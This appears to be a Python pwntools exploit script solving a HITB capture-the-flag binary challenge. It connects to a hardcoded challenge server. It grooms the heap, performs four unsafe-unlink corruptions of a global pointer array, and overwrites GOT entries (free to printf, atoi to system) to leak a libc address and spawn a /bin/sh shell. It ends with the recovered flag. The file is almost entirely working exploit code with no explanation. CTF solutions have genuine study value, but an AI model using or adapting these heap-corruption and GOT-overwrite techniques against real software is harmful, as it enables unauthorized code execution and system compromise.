from pwn import *
import sys

if len(sys.argv) == 1:
    p = process(["./d_patch"])

else:
    p = remote("47.75.154.113", "9999")

context.binary = "./d"
binary = ELF("./d")
context.log_level = "debug"

'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

def read_msg(idx, msg):
    p.sendlineafter("Which? :", "1")
    p.sendlineafter("Which? :", str(idx))
    p.sendlineafter("msg:", msg)

def edit_msg(idx, msg):
    p.sendlineafter("Which? :", "2")
    p.sendlineafter("Which? :", str(idx))
    p.sendlineafter("new msg:", msg)

def wipe_msg(idx):
    p.sendlineafter("Which? :", "3")
    p.sendlineafter("Which? :", str(idx))

ptr = 0x0000000000602180        # array 64
target = ptr + 0x18
# size 0x210 + 1( prev_inuse_bit )

read_msg(0, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(1, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(2, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(3, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(4, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(5, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(6, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(7, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(8, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(9, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(10, "a" * (0x3f6/2) + "b" * (0x3f6/2))

#####

read_msg(11, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(12, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(13, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(14, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(15, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(16, "a" * (0x3f6/2) + "b" * (0x3f6/2))

#####
#####

read_msg(17, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(18, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(19, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(20, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(21, "a" * (0x3f6/2) + "b" * (0x3f6/2))
read_msg(22, "a" * (0x3f6/2) + "b" * (0x3f6/2))

#####

# unlink 1

edit_msg(3, p64(0) + p64(0x2f1) + p64(target - 0x18) + p64(target - 0x10) + "A" * 0x2d0 + p64(0x2f0))
wipe_msg(4)

# unlink 2

target = ptr + 8 * 8
edit_msg(8, p64(0) + p64(0x2f1) + p64(target - 0x18) + p64(target - 0x10) + "A" * 0x2d0 + p64(0x2f0))
wipe_msg(9)

# unlink 3

target = ptr + 8 * 14
edit_msg(14, p64(0) + p64(0x2f1) + p64(target - 0x18) + p64(target - 0x10) + "A" * 0x2d0 + p64(0x2f0))
wipe_msg(15)

# unlink 4

target = ptr + 8 * 20
edit_msg(20, p64(0) + p64(0x2f1) + p64(target - 0x18) + p64(target - 0x10) + "A" * 0x2d0 + p64(0x2f0))
wipe_msg(21)

#edit_msg(3, "\x28\x20\x60")     # strlen
#edit_msg(3, "\x68\x20\x60")     # atoi

time.sleep(0.2)
edit_msg(3, "\x18\x20\x60")     # free
time.sleep(0.2)
edit_msg(0, "\xa0\x07\x40".ljust(6, "\x00"))        # free to printf
time.sleep(0.2)
edit_msg(20, "\x68\x20\x60")     # atoi

time.sleep(0.2)
edit_msg(8, "\x68\x20\x60".ljust(6, "\x00"))     # atoi@got
wipe_msg(5)     # free -> leak
p.recvuntil("Which? :")
libc = u64(p.recv(6).ljust(8, "\x00"))
libc_base = libc - 0x36e80
system = libc_base + 0x45390

print hex(libc)
print hex(libc_base)
print hex(system)

time.sleep(0.2)
edit_msg(10, "/bin/sh")
time.sleep(0.2)
edit_msg(14, "\x28\x20\x60")     # strlen@got
edit_msg(11, "\xe0\x07\x40".ljust(6, "\x00"))        # strlen@got to printf
edit_msg(17, p64(system).replace("\x00", ""))          # atoi to system
# 17 -> atoi
time.sleep(0.2)
p.sendline("/bin/sh\x00")

p.interactive()

# HITB{b4se364_1s_th3_b3st_3nc0d1ng!}
